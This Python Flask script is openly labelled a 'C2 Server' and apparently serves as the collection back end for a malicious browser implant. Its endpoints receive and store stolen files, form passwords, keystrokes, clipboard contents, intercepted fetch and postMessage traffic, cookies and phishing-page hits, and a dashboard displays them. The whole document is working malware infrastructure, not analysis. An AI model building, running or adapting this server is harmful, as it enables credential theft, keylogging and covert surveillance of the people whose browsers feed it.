#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import os
import logging
from datetime import datetime
from collections import defaultdict

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

data_store = {
    'pages': [],
    'files': [],
    'cookies': [],
    'extensions': [],
    'credentials': [],
    'keystrokes': [],
    'fetch': [],
    'messages': [],
    'clipboard': [],
    'heartbeats': []
}

@app.route('/api/collect', methods=['POST'])
def collect():
    """Main data collection endpoint"""
    try:
        d = request.get_json()
        if d:
            d['ip'] = request.remote_addr
            d['time'] = datetime.now().isoformat()
            
            data_type = d.get('type', 'unknown')
            if data_type in data_store:
                data_store[data_type].append(d)

            with open('collected.json', 'a') as f:
                f.write(json.dumps(d) + '\n')

            if data_type == 'file':
                filepath = d.get('data', {}).get('path', 'unknown')
                filename = os.path.basename(filepath)
                with open(f'stolen_{filename}', 'w') as f:
                    f.write(d.get('data', {}).get('content', ''))
            
            logging.info(f"Data from {request.remote_addr}: {data_type}")
            return jsonify({'status': 'ok'})
    except Exception as e:
        logging.error(f"Error: {e}")
    return '', 400

@app.route('/api/page', methods=['POST'])
def page_data():
    """Endpoint for page-related data"""
    try:
        d = request.get_json()
        if d:
            d['ip'] = request.remote_addr
            d['time'] = datetime.now().isoformat()
            data_store['pages'].append(d)

            if 'inputs' in d:
                with open('passwords.txt', 'a') as f:
                    for inp in d['inputs']:
                        if inp.get('value') and len(inp['value']) > 3:
                            f.write(f"{d['url']} - {inp['name']}: {inp['value']}\n")
            
            return jsonify({'status': 'ok'})
    except:
        pass
    return '', 400

@app.route('/api/key', methods=['POST'])
def keylogger():
    """Endpoint for logging keystrokes"""
    try:
        d = request.get_json()
        if d:
            data_store['keystrokes'].append(d)
            with open('keystrokes.log', 'a') as f:
                f.write(json.dumps(d) + '\n')
    except:
        pass
    return '', 204

@app.route('/api/fetch', methods=['POST'])
def fetch_intercept():
    """Endpoint for fetch interception"""
    try:
        d = request.get_json()
        if d:
            data_store['fetch'].append(d)
    except:
        pass
    return '', 204

@app.route('/api/message', methods=['POST'])
def message_intercept():
    """Endpoint for postMessage interception"""
    try:
        d = request.get_json()
        if d:
            data_store['messages'].append(d)
    except:
        pass
    return '', 204

@app.route('/api/clipboard', methods=['POST'])
def clipboard():
    """Endpoint for clipboard data exfiltration"""
    try:
        d = request.get_json()
        if d:
            data_store['clipboard'].append(d)
            with open('clipboard.txt', 'a') as f:
                f.write(d.get('text', '') + '\n---\n')
    except:
        pass
    return '', 204

@app.route('/api/phishing', methods=['POST'])
def phishing():
    """Endpoint to track phishing page activity"""
    try:
        d = request.get_json()
        logging.warning(f"Phishing page opened: {d}")
    except:
        pass
    return '', 204

@app.route('/steal', methods=['POST'])
def steal():
    """Endpoint for receiving exfiltrated files"""
    try:
        d = request.get_json()
        if d:
            filepath = d.get('file', 'unknown')
            content = d.get('data', '')
            
            filename = os.path.basename(filepath)
            with open(f'stolen_{filename}', 'w') as f:
                f.write(content)
            
            data_store['files'].append({
                'ip': request.remote_addr,
                'file': filepath,
                'size': len(content),
                'time': datetime.now().isoformat()
            })
            
            logging.critical(f"FILE STEAL: {filepath} ({len(content)} bytes)")
    except:
        pass
    return '', 204

@app.route('/dashboard')
def dashboard():
    """C2 Control Dashboard interface"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Dashboard</title>
        <meta charset="utf-8">
        <meta http-equiv="refresh" content="5">
        <style>
            body { font-family: monospace; margin: 20px; background: #000; color: #0f0; }
            .container { max-width: 1200px; margin: auto; }
            h1 { color: #0f0; border-bottom: 1px solid #0f0; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; }
            .stat { background: #111; padding: 10px; border: 1px solid #0f0; }
            .stat span { color: #0f0; font-size: 24px; display: block; }
            table { width: 100%; border-collapse: collapse; margin: 20px 0; }
            th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
            th { background: #111; }
            tr:hover { background: #1a1a1a; }
            .tab { display: inline-block; padding: 10px 20px; cursor: pointer; border: 1px solid #0f0; }
            .tab.active { background: #0f0; color: #000; }
            .tab-content { display: none; border: 1px solid #0f0; padding: 20px; margin-top: -1px; }
            .tab-content.active { display: block; }
            pre { background: #111; padding: 10px; overflow: auto; max-height: 500px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1> C2 Dashboard By indoushka</h1>
            
            <div class="stats">
                <div class="stat">Pages: <span>{{ pages }}</span></div>
                <div class="stat">Files: <span>{{ files }}</span></div>
                <div class="stat">Keys: <span>{{ keys }}</span></div>
                <div class="stat">Cookies: <span>{{ cookies }}</span></div>
            </div>
            
            <div>
                <div class="tab active" onclick="showTab('pages')">Pages</div>
                <div class="tab" onclick="showTab('files')">Files</div>
                <div class="tab" onclick="showTab('keys')">Keystrokes</div>
                <div class="tab" onclick="showTab('cookies')">Cookies</div>
                <div class="tab" onclick="showTab('extensions')">Extensions</div>
            </div>
            
            <div id="pages" class="tab-content active">
                <h3> Pages ({{ pages_count }})</h3>
                <pre>{{ pages_data }}</pre>
            </div>
            
            <div id="files" class="tab-content">
                <h3> Stolen Files ({{ files_count }})</h3>
                <pre>{{ files_data }}</pre>
            </div>
            
            <div id="keys" class="tab-content">
                <h3> Keystrokes ({{ keys_count }})</h3>
                <pre>{{ keys_data }}</pre>
            </div>
            
            <div id="cookies" class="tab-content">
                <h3> Cookies ({{ cookies_count }})</h3>
                <pre>{{ cookies_data }}</pre>
            </div>
            
            <div id="extensions" class="tab-content">
                <h3> Installed Extensions</h3>
                <pre>{{ extensions_data }}</pre>
            </div>
        </div>
        
        <script>
            function showTab(tab) {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                event.target.classList.add('active');
                document.getElementById(tab).classList.add('active');
            }
        </script>
    </body>
    </html>
    '''
    
    return render_template_string(html,
        pages=len(data_store['pages']),
        files=len(data_store['files']),
        keys=len(data_store['keystrokes']),
        cookies=len(data_store['cookies']),
        pages_count=len(data_store['pages']),
        files_count=len(data_store['files']),
        keys_count=len(data_store['keystrokes']),
        cookies_count=len(data_store['cookies']),
        pages_data=json.dumps(data_store['pages'][-20:], indent=2, ensure_ascii=False),
        files_data=json.dumps(data_store['files'][-20:], indent=2, ensure_ascii=False),
        keys_data=json.dumps(data_store['keystrokes'][-50:], indent=2, ensure_ascii=False),
        cookies_data=json.dumps(data_store['cookies'][-10:], indent=2, ensure_ascii=False),
        extensions_data=json.dumps(data_store['extensions'][-5:], indent=2, ensure_ascii=False)
    )

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════╗
    ║      C2 Server Started by indoushka       ║
    ╠═══════════════════════════════════════════╣
    ║ Dashboard: http://localhost:8080/dashboard ║
    ╚═══════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=8080, debug=True)
